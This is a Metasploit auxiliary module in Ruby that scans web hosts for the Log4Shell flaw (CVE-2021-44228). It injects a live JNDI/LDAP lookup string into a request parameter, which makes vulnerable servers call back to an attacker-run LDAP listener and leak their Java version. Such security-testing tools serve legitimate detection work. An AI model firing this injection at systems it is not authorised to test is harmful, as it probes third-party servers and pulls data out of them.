##
# This module requires Metasploit: https://metasploit.com/download
##

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::TcpServer
  include Msf::Auxiliary::Scanner
  require "base64"

  def initialize
    super(
      'Name' => 'Log4Shell Scanner',
      'Description' => %q{Apache Log4j RCE Scanner},
      'Author'         => ['Madhav Bhatt'],
      'References'     => ['CVE', '2021-44228'],
      'License'        =>  MSF_LICENSE
    )

    register_options([
                       OptString.new('HTTP_METHOD', [ true, 'The HTTP method to use', 'GET' ]),
                       OptString.new('TARGETURI', [ true, 'The URI to scan', '/']),
                       OptInt.new('LDAP_TIMEOUT', [ true, 'Time in seconds to wait to receive LDAP connections', 60 ]),
                       OptString.new('ExternalIP', [ true, "IP of the host LDAP query will connect to ",'0.0.0.0' ]),
                       OptString.new('PARAMETER_NAME', [true, 'Parameters for the request. The payload will be sent in first parameter.', 'C'])
                     ])
  end

  def jndi_string(resource)
    "${jndi:ldap://#{datastore['ExternalIP']}:#{datastore['SRVPORT']}/#{resource}/${sys:java.vendor}_${sys:java.version}}"
  end

  def on_client_connect(client)
    # check if the LDAP request is a bind request
    client.extend(Net::BER::BERParser)
    pdu = Net::LDAP::PDU.new(client.read_ber(Net::LDAP::AsnSyntax))
    return unless pdu.app_tag == Net::LDAP::PDU::BindRequest

    response = [
      pdu.message_id.to_ber,
      [
        Net::LDAP::ResultCodeSuccess.to_ber_enumerated, ''.to_ber, ''.to_ber
      ].to_ber_appsequence(Net::LDAP::PDU::BindResult)
    ].to_ber_sequence
    client.write(response)

    pdu = Net::LDAP::PDU.new(client.read_ber(Net::LDAP::AsnSyntax))
    return unless pdu.app_tag == Net::LDAP::PDU::SearchRequest

    # extacts the ldap URI parameter from the  payload
    # for example if payload is ${jndi:ldap://192.168.11.128:8096/MTkyLjE2OC4xMS4xMjk6ODA=/${sys:java.vendor}_${sys:java.version}} , token will be MTkyLjE2OC4xMS4xMjk6ODA= AND java_version will be the payload result

    base_object = pdu.search_parameters[:base_object].to_s
    token, java_version = base_object.split('/', 2)

    vicip = Base64.decode64(token).split(':')[0]
    vicport = Base64.decode64(token).split(':')[-1]
    peerinfo = "#{vicip}:#{vicport}"
    print_good("#{peerinfo.ljust(21)} - Log4Shell found with Java Version #{java_version}")


  rescue Net::LDAP::PDU::Error => e
    vprint_error("#{peer} - #{e}")
  ensure
    service.close_client(client)
  end

  def run
    fail_with(Failure::BadConfig, 'The ExternalIP option must be set to a routable IP address.') if ['0.0.0.0', '::'].include?(datastore['ExternalIP'])

    begin
      start_service('SSL' => false)
    rescue Rex::BindFailed => e
      fail_with(Failure::BadConfig, e.to_s)
    end
    super
    print_status("Sleeping #{datastore['LDAP_TIMEOUT']} seconds for any last LDAP connections")
    sleep datastore['LDAP_TIMEOUT']
  ensure
    stop_service
  end

  def run_host(ip)
    httpmethod = datastore['HTTP_METHOD']
    remotehostport = "#{datastore['rhost']}:#{datastore['rport']}"
    # token base64 encoded value of rhost:rport

    token = Base64.encode64(remotehostport).strip
    jndi = jndi_string(token)
    params = datastore['PARAMETER_NAME'].split(',')

    # It will add jndi payload to the first variable

    param_dict = Hash.new
    params.each_with_index do |param,i|
      if i==0
        param_dict = { param => jndi }
      else
        param_dict[param] = param
      end
    end

    targeturi = datastore['TARGETURI']

    sslvalue = datastore['SSL']

    if sslvalue
      fulluri = "https://#{rhost}:#{rport}#{targeturi}"
    else
      fulluri = "http://#{rhost}:#{rport}#{targeturi}"
    end

    if not send_request_cgi('uri' => normalize_uri(target_uri)).nil?
      print_good("#{fulluri} found ")
      print_status("PREPARING TO SEND PAYLOAD : #{jndi}")
    else
      print_bad("#{fulluri} not found ")
      print_status("Try sending the payload manually : #{jndi}")
      return
    end

    # Checking if HTTP METHOD is GET or POST.
    begin
      if httpmethod == 'GET'
        print_status("Sending GET Request")

        getreq = {
          'method'  => httpmethod,
          'uri'     => targeturi,
          'ctype'   => 'text/plain'
        }
        getvars = Hash.new
        getvars['vars_get'] = param_dict
        res = send_request_cgi(getreq.merge(getvars))
      elsif httpmethod == 'POST'
        print_status("Sending POST Request")

        postreq = {
          'method'  => httpmethod,
          'uri'     => targeturi,
          'ctype'   => 'text/plain'
        }
        postvars = Hash.new
        postvars['vars_get'] = param_dict
        res = send_request_cgi(postreq.merge(postvars))
      else
        vprint_status("Only HTTP Get and Post methods are allowed")
      end

      return unless res

    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
    rescue ::Timeout::Error, ::Errno::EPIPE
    end
  end

end

